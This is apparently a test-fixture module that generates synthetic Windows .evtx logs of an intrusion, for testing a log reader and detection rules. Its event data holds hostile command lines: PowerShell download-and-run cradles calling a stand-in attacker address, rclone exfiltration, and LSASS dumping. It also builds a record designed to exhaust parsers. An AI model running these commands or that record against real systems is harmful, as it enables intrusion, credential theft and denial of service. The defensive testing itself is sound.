// Copyright 2026- Seongwoo Hong. All rights reserved.

/**
 * Windows event logs (.evtx), built when a test runs (commit 42j) — an
 * intrusion's worth of events (failed logons, then a success; PsExec's
 * service; an encoded PowerShell command; the log cleared) is what a
 * detection rule flags on disk, so it is assembled here, not kept.
 *
 * Written the way Windows writes them, so the reader is tested on the
 * shape it will meet:
 *
 *   file header   "ElfFile", chunk count, next record number, flags, CRC-32
 *   chunks        64 KiB, "ElfChnk", record number range, the names' and
 *                 templates' hash tables (their chains filled), a CRC-32
 *                 of the records and one of the header
 *   records       "**", number, write time, Binary XML, size again
 *   Binary XML    one template per chunk for <System>, defined inline the
 *                 first time and referred to after; <EventData> (or
 *                 <UserData>) a nested Binary XML value with a template of
 *                 its own per shape; names written inline once per chunk
 *
 * python-evtx reads what this writes (checked when this was written).
 */

const enc16 = (s) => {
	const b = new Uint8Array(s.length * 2);
	for (let i = 0; i < s.length; i++) {
		b[i * 2] = s.charCodeAt(i) & 0xff;
		b[i * 2 + 1] = s.charCodeAt(i) >> 8;
	}
	return b;
};

const CRC = (() => {
	const t = new Uint32Array(256);
	for (let n = 0; n < 256; n++) {
		let c = n;
		for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1;
		t[n] = c >>> 0;
	}
	return t;
})();
const crc32 = (...parts) => {
	let c = 0xffffffff;
	for (const p of parts) for (let i = 0; i < p.length; i++) c = CRC[(c ^ p[i]) & 0xff] ^ (c >>> 8);
	return (c ^ 0xffffffff) >>> 0;
};

/** An ISO time (to 100 ns: "2024-03-01T10:00:00.1234567Z") as FILETIME ticks. */
export function ticks(iso) {
	const m = /^(\d{4}-\d\d-\d\dT\d\d:\d\d:\d\d)(?:\.(\d{1,7}))?Z$/.exec(iso);
	if (!m) throw new Error(`not an ISO time: ${iso}`);
	const secs = BigInt(Date.parse(`${m[1]}Z`) / 1000);
	return (secs + 11644473600n) * 10_000_000n + BigInt((m[2] ?? "").padEnd(7, "0"));
}

const sidBytes = (s) => {
	const p = s.split("-");
	if (p[0] !== "S") throw new Error(`not a SID: ${s}`);
	const subs = p.slice(3).map(Number);
	const b = new Uint8Array(8 + subs.length * 4);
	const v = new DataView(b.buffer);
	b[0] = Number(p[1]);
	b[1] = subs.length;
	let auth = BigInt(p[2]);
	for (let i = 7; i >= 2; i--) ((b[i] = Number(auth & 0xffn)), (auth >>= 8n));
	subs.forEach((x, i) => v.setUint32(8 + i * 4, x >>> 0, true));
	return b;
};

const guidBytes = (s) => {
	const h = s.replace(/[{}-]/g, "");
	const b = Uint8Array.from(h.match(/../g).map((x) => parseInt(x, 16)));
	return Uint8Array.from([b[3], b[2], b[1], b[0], b[5], b[4], b[7], b[6], ...b.subarray(8)]);
};

/** A value's type code and bytes. `kind` names the type; the default is a string. */
function typed(value, kind = "string") {
	if (value === null || value === undefined) return [0x00, new Uint8Array(0)];
	const n = (w, set) => {
		const b = new Uint8Array(w);
		set(new DataView(b.buffer));
		return b;
	};
	switch (kind) {
		case "string":
			return [0x01, enc16(`${value}\0`)];
		case "strings":
			return [0x81, enc16(value.map((x) => `${x}\0`).join(""))];
		case "u8":
			return [0x04, Uint8Array.of(value)];
		case "u16":
			return [0x06, n(2, (v) => v.setUint16(0, value, true))];
		case "u32":
			return [0x08, n(4, (v) => v.setUint32(0, value, true))];
		case "u64":
			return [0x0a, n(8, (v) => v.setBigUint64(0, BigInt(value), true))];
		case "bool":
			return [0x0d, n(4, (v) => v.setUint32(0, value ? 1 : 0, true))];
		case "binary":
			return [0x0e, Uint8Array.from(value.match(/../g) ?? [], (x) => parseInt(x, 16))];
		case "guid":
			return [0x0f, guidBytes(value)];
		case "filetime":
			return [0x11, n(8, (v) => v.setBigUint64(0, ticks(value), true))];
		case "sid":
			return [0x13, sidBytes(value)];
		case "hex32":
			return [0x14, n(4, (v) => v.setUint32(0, Number(value), true))];
		case "hex64":
			return [0x15, n(8, (v) => v.setBigUint64(0, BigInt(value), true))];
		default:
			throw new Error(`no value type ${kind}`);
	}
}

/** Windows' hash of a name (kept in the Name structure; readers need not check it). */
const nameHash = (s) => {
	let h = 0;
	for (let i = 0; i < s.length; i++) h = (Math.imul(h, 65599) + s.charCodeAt(i)) >>> 0;
	return h & 0xffff;
};

const NS = "http://schemas.microsoft.com/win/2004/08/events/event";

/** One chunk being written: a cursor, and the names and templates it holds. */
class Chunk {
	constructor() {
		// Room past 64 KiB, so a record that does not fit is found by writing it.
		this.b = new Uint8Array(65536 * 2);
		this.v = new DataView(this.b.buffer);
		this.pos = 512;
		this.names = new Map();
		this.templates = new Map();
		this.records = [];
	}
	snapshot() {
		return { pos: this.pos, names: new Map(this.names), templates: new Map(this.templates), table: this.b.slice(128, 512) };
	}
	restore(s) {
		this.b.fill(0, s.pos);
		this.pos = s.pos;
		this.names = s.names;
		this.templates = s.templates;
		this.b.set(s.table, 128);
	}
	u8(x) {
		this.b[this.pos++] = x;
	}
	u16(x) {
		this.v.setUint16(this.pos, x, true);
		this.pos += 2;
	}
	u32(x) {
		this.v.setUint32(this.pos, x >>> 0, true);
		this.pos += 4;
	}
	u64(x) {
		this.v.setBigUint64(this.pos, BigInt(x), true);
		this.pos += 8;
	}
	bytes(b) {
		this.b.set(b, this.pos);
		this.pos += b.length;
	}
	/** A name's offset — written here, inline, the first time (and chained into the table). */
	name(s) {
		const at = this.names.get(s);
		this.u32(at ?? this.pos + 4);
		if (at !== undefined) return;
		const off = this.pos;
		this.names.set(s, off);
		const bucket = 128 + (nameHash(s) % 64) * 4;
		this.u32(this.v.getUint32(bucket, true)); // the next name in its bucket
		this.v.setUint32(bucket, off, true);
		this.u16(nameHash(s));
		this.u16(s.length);
		this.bytes(enc16(s));
		this.u16(0);
	}
	text(s) {
		this.u8(0x05);
		this.u8(0x01);
		this.u16(s.length);
		this.bytes(enc16(s));
	}
	sub(index, type, optional = true) {
		this.u8(optional ? 0x0e : 0x0d);
		this.u16(index);
		this.u8(type);
	}
	/** An element: attrs [[name, write]], then the children (or empty). */
	element(name, attrs, children) {
		this.u8(attrs.length ? 0x41 : 0x01);
		this.u16(0xffff); // no dependency
		const sizeAt = this.pos;
		this.u32(0);
		this.name(name);
		if (attrs.length) {
			const listAt = this.pos;
			this.u32(0);
			attrs.forEach(([an, write], i) => {
				this.u8(i < attrs.length - 1 ? 0x46 : 0x06);
				this.name(an);
				write();
			});
			this.v.setUint32(listAt, this.pos - listAt - 4, true);
		}
		if (children) {
			this.u8(0x02);
			children();
			this.u8(0x04);
		} else this.u8(0x03);
		this.v.setUint32(sizeAt, this.pos - sizeAt - 4, true);
	}
	/** A template instance: its definition the first time, then its values. */
	instance(key, body, values) {
		let def = this.templates.get(key);
		this.u8(0x0c);
		this.u8(0x01);
		const id = (this.templates.size + 1) * 0x01010101;
		this.u32(id);
		if (def === undefined) {
			def = this.pos + 4;
			this.templates.set(key, def);
			this.u32(def);
			const bucket = 384 + ((this.templates.size - 1) % 32) * 4;
			this.u32(this.v.getUint32(bucket, true)); // the next template in its bucket
			this.v.setUint32(bucket, def, true);
			this.u32(id);
			this.bytes(Uint8Array.of(0x47, 0x6f, 0x72, 0x61, 0x6e, 0x69, 0x34, 0x32, 0x6a, 0, 0, 0)); // the rest of its GUID
			const sizeAt = this.pos;
			this.u32(0);
			const start = this.pos;
			this.bytes(Uint8Array.of(0x0f, 0x01, 0x01, 0x00));
			body();
			this.u8(0x00);
			this.v.setUint32(sizeAt, this.pos - start, true);
		} else this.u32(def);
		// The values: their sizes and types, then each one.
		this.u32(values.length);
		const descAt = this.pos;
		this.pos += values.length * 4;
		values.forEach(([type, write], i) => {
			const from = this.pos;
			write();
			this.v.setUint16(descAt + i * 4, this.pos - from, true);
			this.b[descAt + i * 4 + 2] = type;
		});
	}
}

/** Write the values of one event's <EventData> (or <UserData>) as nested Binary XML. */
function eventData(c, e) {
	const data = (Array.isArray(e.data) ? e.data : Object.entries(e.data ?? {})).map(([k, v, kind]) => [k, ...typed(v, kind)]);
	const subs = data.map(([, type, b]) => [type, () => c.bytes(b)]);
	c.bytes(Uint8Array.of(0x0f, 0x01, 0x01, 0x00));
	if (e.userData) {
		c.instance(
			`U:${e.userData}:${data.map(([k, t]) => `${k}/${t}`).join(",")}`,
			() =>
				c.element("UserData", [], () =>
					c.element(e.userData, [["xmlns", () => c.text("http://manifests.microsoft.com/win/2004/08/windows/eventlog")]], () => data.forEach(([k, t], i) => c.element(k, [], () => c.sub(i, t)))),
				),
			subs,
		);
	} else {
		c.instance(
			`D:${data.map(([k, t]) => `${k}/${t}`).join(",")}`,
			() => c.element("EventData", [], () => data.forEach(([k, t], i) => (/^Data \d+$/.test(k) ? c.element("Data", [], () => c.sub(i, t)) : c.element("Data", [["Name", () => c.text(k)]], () => c.sub(i, t))))),
			subs,
		);
	}
}

/** The <System> part, the same in every event: one template per chunk. */
function system(c) {
	const t = (name, i, type) => c.element(name, [], () => c.sub(i, type));
	c.element("Event", [["xmlns", () => c.text(NS)]], () => {
		c.element("System", [], () => {
			c.element("Provider", [["Name", () => c.sub(0, 0x01)]], null);
			t("EventID", 1, 0x06);
			t("Level", 2, 0x04);
			t("Task", 3, 0x06);
			t("Opcode", 4, 0x04);
			t("Keywords", 5, 0x15);
			c.element("TimeCreated", [["SystemTime", () => c.sub(6, 0x11)]], null);
			t("EventRecordID", 7, 0x0a);
			c.element("Execution", [["ProcessID", () => c.sub(8, 0x08)], ["ThreadID", () => c.sub(9, 0x08)]], null);
			t("Channel", 10, 0x01);
			t("Computer", 11, 0x01);
			c.element("Security", [["UserID", () => c.sub(12, 0x13)]], null);
		});
		// Then EventData or UserData: a value of its own (nested Binary XML).
		c.sub(13, 0x21);
	});
}

function writeRecord(c, e, record, when) {
	const start = c.pos;
	c.u32(0x00002a2a);
	c.u32(0);
	c.u64(record);
	c.u64(ticks(when));
	c.bytes(Uint8Array.of(0x0f, 0x01, 0x01, 0x00));
	const v = (x, kind) => {
		const [type, b] = typed(x, kind);
		return [type, () => c.bytes(b)];
	};
	const hasData = e.userData || (Array.isArray(e.data) ? e.data.length : Object.keys(e.data ?? {}).length);
	if (e.raw) e.raw(c);
	else c.instance("System", () => system(c), [
		v(e.provider, "string"),
		v(e.id, "u16"),
		v(e.level ?? 0, "u8"),
		v(e.task ?? 0, "u16"),
		v(e.opcode ?? 0, "u8"),
		v(e.keywords ?? "0x8020000000000000", "hex64"),
		v(e.time ?? when, "filetime"),
		v(record, "u64"),
		v(e.pid ?? 4, "u32"),
		v(e.tid ?? 8, "u32"),
		v(e.channel ?? "Security", "string"),
		v(e.computer ?? "WKS-01.corp.example", "string"),
		e.user ? v(e.user, "sid") : [0x00, () => {}],
		hasData ? [0x21, () => eventData(c, e)] : [0x00, () => {}],
	]);
	c.u32(c.pos - start + 4);
	c.v.setUint32(start + 4, c.pos - start, true);
	return start;
}

/**
 * An intrusion, one event per step (51 events, a second apart): password
 * spraying from one address, then a Remote Desktop logon from it; an
 * account made and put in Administrators; PsExec's service; a scheduled
 * task and a WMI subscription that download and run; encoded PowerShell;
 * Word starting PowerShell; rclone; LSASS opened by procdump; Kerberoasting,
 * AS-REP roasting, DCSync; an admin share reached; Defender's detection and
 * then its protection off; the audit policy changed; the log cleared.
 */
export function intrusion() {
	const SA = "Microsoft-Windows-Security-Auditing";
	const who3 = [["SubjectUserName", "user3"], ["SubjectDomainName", "CORP"]];
	return [
		...Array.from({ length: 30 }, (_, i) => ({ provider: SA, id: 4625, keywords: "0x8010000000000000", data: [["TargetUserName", `user${i % 7}`], ["TargetDomainName", "CORP"], ["LogonType", "3"], ["IpAddress", "203.0.113.9"], ["Status", "0xc000006d"]] })),
		{ provider: SA, id: 4624, user: "S-1-5-18", data: [["TargetUserName", "user3"], ["TargetDomainName", "CORP"], ["LogonType", "10"], ["IpAddress", "203.0.113.9"], ["WorkstationName", "KALI"]] },
		{ provider: SA, id: 4720, data: [["TargetUserName", "svc-backup"], ["TargetDomainName", "CORP"], ["TargetSid", "S-1-5-21-1-2-3-1105", "sid"], ...who3] },
		{ provider: SA, id: 4732, data: [["MemberName", "-"], ["MemberSid", "S-1-5-21-1-2-3-1105", "sid"], ["TargetUserName", "Administrators"], ["TargetDomainName", "Builtin"], ...who3] },
		{ provider: "Service Control Manager", id: 7045, channel: "System", level: 4, keywords: "0x8080000000000000", data: [["ServiceName", "PSEXESVC"], ["ImagePath", "%SystemRoot%\\PSEXESVC.exe"], ["ServiceType", "user mode service"], ["StartType", "demand start"], ["AccountName", "LocalSystem"]] },
		{ provider: SA, id: 4698, data: [["TaskName", "\\Microsoft\\Windows\\Updater"], ["TaskContent", "<Task><Actions><Exec><Command>powershell.exe</Command><Arguments>-w hidden -nop -c iex(iwr http://203.0.113.9/s.ps1)</Arguments></Exec></Actions></Task>"], ...who3] },
		{ provider: "Microsoft-Windows-PowerShell", id: 4104, level: 3, channel: "Microsoft-Windows-PowerShell/Operational", data: [["MessageNumber", 1, "u32"], ["MessageTotal", 1, "u32"], ["ScriptBlockText", "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/a')"], ["ScriptBlockId", "{11111111-2222-3333-4444-555555555555}"]] },
		{ provider: SA, id: 4688, data: [["NewProcessName", "C:\\Windows\\System32\\cmd.exe"], ["CommandLine", `cmd.exe /c powershell -enc ${Buffer.from("whoami /all", "utf16le").toString("base64")}`], ["ParentProcessName", "C:\\Windows\\explorer.exe"], ...who3] },
		{ provider: "Microsoft-Windows-Sysmon", id: 1, channel: "Microsoft-Windows-Sysmon/Operational", data: [["Image", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"], ["CommandLine", "powershell.exe -nop"], ["ParentImage", "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"]] },
		{ provider: SA, id: 4688, data: [["NewProcessName", "C:\\Users\\Public\\rclone.exe"], ["CommandLine", "rclone.exe copy C:\\Finance remote:loot"], ["ParentProcessName", "C:\\Windows\\System32\\cmd.exe"], ...who3] },
		{ provider: "Microsoft-Windows-Sysmon", id: 10, channel: "Microsoft-Windows-Sysmon/Operational", data: [["SourceImage", "C:\\Users\\Public\\procdump64.exe"], ["TargetImage", "C:\\Windows\\system32\\lsass.exe"], ["GrantedAccess", "0x1fffff"]] },
		...["MSSQLSvc/db1", "HTTP/web1", "CIFS/fs1"].map((svc) => ({ provider: SA, id: 4769, data: [["TargetUserName", "user3@CORP"], ["ServiceName", svc], ["TicketEncryptionType", "0x17"], ["Status", "0x0"], ["IpAddress", "::ffff:10.0.0.5"]] })),
		{ provider: SA, id: 4768, data: [["TargetUserName", "legacy-svc"], ["PreAuthType", "0"], ["Status", "0x0"], ["IpAddress", "10.0.0.5"]] },
		{ provider: SA, id: 4662, data: [["Properties", "%%7688 {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}"], ...who3] },
		{ provider: SA, id: 5140, data: [["ShareName", "\\\\*\\ADMIN$"], ["IpAddress", "203.0.113.9"], ...who3] },
		{ provider: "Microsoft-Windows-Windows Defender", id: 1116, level: 3, channel: "Microsoft-Windows-Windows Defender/Operational", data: [["Threat Name", "HackTool:Win64/Mimikatz"], ["Path", "file:_C:\\Users\\Public\\m.exe"]] },
		{ provider: "Microsoft-Windows-Windows Defender", id: 5001, level: 3, channel: "Microsoft-Windows-Windows Defender/Operational", data: [] },
		{ provider: "Microsoft-Windows-WMI-Activity", id: 5861, channel: "Microsoft-Windows-WMI-Activity/Operational", data: [["Namespace", "//./root/subscription"], ["PossibleCause", "Binding EventFilter: Boot; Consumer: CommandLineEventConsumer=\"powershell -w hidden -c iex(iwr http://203.0.113.9/w)\""]] },
		{ provider: SA, id: 4719, data: [["CategoryId", "%%8274"], ["AuditPolicyChanges", "%%8448"], ...who3] },
		{ provider: "Microsoft-Windows-Eventlog", id: 1102, userData: "LogFileCleared", data: [["SubjectUserSid", "S-1-5-21-1-2-3-1104", "sid"], ["SubjectUserName", "user3"], ["SubjectDomainName", "CORP"], ["SubjectLogonId", "0x3e7", "hex64"]] },
	];
}

/**
 * A record built to exhaust a reader: a template is defined once and copied
 * into every instance of it, so one record of a few thousand tiny nested
 * instances of a wider template expands to `copies × (width + 1)` nodes
 * from under 64 KiB. (A reader must cap what one record may expand to.)
 */
export const amplifier = (copies = 2000, width = 30) => ({
	raw(c) {
		const wide = () =>
			c.element("Event", [], () => {
				for (let i = 0; i < width; i++) c.element("E", [], null);
			});
		const values = Array.from({ length: copies }, () => [
			0x21,
			() => {
				c.bytes(Uint8Array.of(0x0f, 0x01, 0x01, 0x00));
				c.instance("Wide", wide, []);
			},
		]);
		c.instance(
			"Holes",
			() =>
				c.element("Event", [], () => {
					for (let i = 0; i < copies; i++) c.sub(i, 0x21);
				}),
			values,
		);
	},
});

/**
 * A whole log. Each event: { provider, id, level?, task?, opcode?,
 * keywords?, time? (ISO), channel?, computer?, user? (SID), pid?, tid?,
 * record? (a number to jump to: the ones skipped are a gap), data:
 * [[name, value, kind?]] or { name: value }, userData?: "RootElement" }.
 * Options: firstRecord, start (ISO, the first event's time; one second
 * apart after), dirty, full, tamper (a byte flipped after the checksums:
 * { chunk, at }).
 */
export function buildEvtx(events, { firstRecord = 1, start = "2024-03-01T09:00:00Z", dirty = false, full = false, tamper = null } = {}) {
	const chunks = [];
	let c = new Chunk();
	let record = firstRecord;
	const t0 = Date.parse(start);
	events.forEach((e, i) => {
		if (e.record) record = e.record;
		const when = e.time ?? new Date(t0 + i * 1000).toISOString().replace(/\.\d+Z$/, "Z");
		const snap = c.snapshot();
		let at = writeRecord(c, e, record, when);
		if (c.pos > 65536) {
			c.restore(snap);
			chunks.push(c);
			c = new Chunk();
			at = writeRecord(c, e, record, when);
			if (c.pos > 65536) throw new Error(`event ${i} is too big for a chunk`);
		}
		c.records.push({ record, at });
		record++;
	});
	chunks.push(c);
	const out = new Uint8Array(4096 + chunks.length * 65536);
	const ov = new DataView(out.buffer);
	chunks.forEach((ch, i) => {
		const b = ch.b.subarray(0, 65536);
		const v = new DataView(b.buffer, b.byteOffset, 65536);
		b.set([0x45, 0x6c, 0x66, 0x43, 0x68, 0x6e, 0x6b, 0x00]); // "ElfChnk\0"
		const first = ch.records[0];
		const last = ch.records.at(-1);
		if (first) {
			v.setBigUint64(8, BigInt(first.record), true);
			v.setBigUint64(16, BigInt(last.record), true);
			v.setBigUint64(24, BigInt(first.record), true);
			v.setBigUint64(32, BigInt(last.record), true);
		}
		v.setUint32(40, 128, true);
		v.setUint32(44, last ? last.at : 512, true);
		v.setUint32(48, ch.pos, true);
		v.setUint32(52, crc32(b.subarray(512, ch.pos)), true);
		v.setUint32(124, crc32(b.subarray(0, 120), b.subarray(128, 512)), true);
		out.set(b, 4096 + i * 65536);
	});
	out.set([0x45, 0x6c, 0x66, 0x46, 0x69, 0x6c, 0x65, 0x00]); // "ElfFile\0"
	ov.setBigUint64(8, 0n, true);
	ov.setBigUint64(16, BigInt(chunks.length - 1), true);
	ov.setBigUint64(24, BigInt(record), true);
	ov.setUint32(32, 128, true);
	ov.setUint16(36, 1, true); // version 3.1, as Windows writes it
	ov.setUint16(38, 3, true);
	ov.setUint16(40, 4096, true);
	ov.setUint16(42, chunks.length, true);
	ov.setUint32(120, (dirty ? 1 : 0) | (full ? 2 : 0), true);
	ov.setUint32(124, crc32(out.subarray(0, 120)), true);
	if (tamper) out[4096 + tamper.chunk * 65536 + tamper.at] ^= 0x20;
	return out;
}
